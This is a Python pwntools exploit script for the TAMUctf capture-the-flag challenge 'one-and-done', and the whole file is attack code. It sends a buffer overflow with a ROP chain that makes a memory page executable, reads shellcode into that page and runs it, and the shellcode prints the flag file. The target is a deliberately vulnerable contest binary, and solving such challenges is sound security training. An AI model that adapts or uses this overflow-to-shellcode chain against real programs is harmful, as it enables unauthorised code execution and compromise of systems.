#!/usr/bin/env python3

from pwn import *

exe = ELF("one-and-done")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("tamuctf.com", 443, ssl=True, sni="one-and-done")

    return r

SUB_RAX_RDI = 0x0000000000402228
SYSCALL_RET = 0x0000000000401ab2
RET = 0x000000000040100c

def main():
    r = conn()

    mmap_chain = ROP(exe)
    mmap_chain(rax=11, rdi=1, rsi=0x1000, rdx=7)
    mmap_chain.call(SUB_RAX_RDI)
    mmap_chain(rdi=0x404000)
    mmap_chain.call(SYSCALL_RET)
    mmap_chain.call(RET)
    mmap_chain.gets(0x404000)
    mmap_chain.call(0x404000)
    r.sendline(b"A" * 296 + mmap_chain.chain())
    r.sendline(asm(shellcraft.cat("/pwn/flag.txt")))

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()

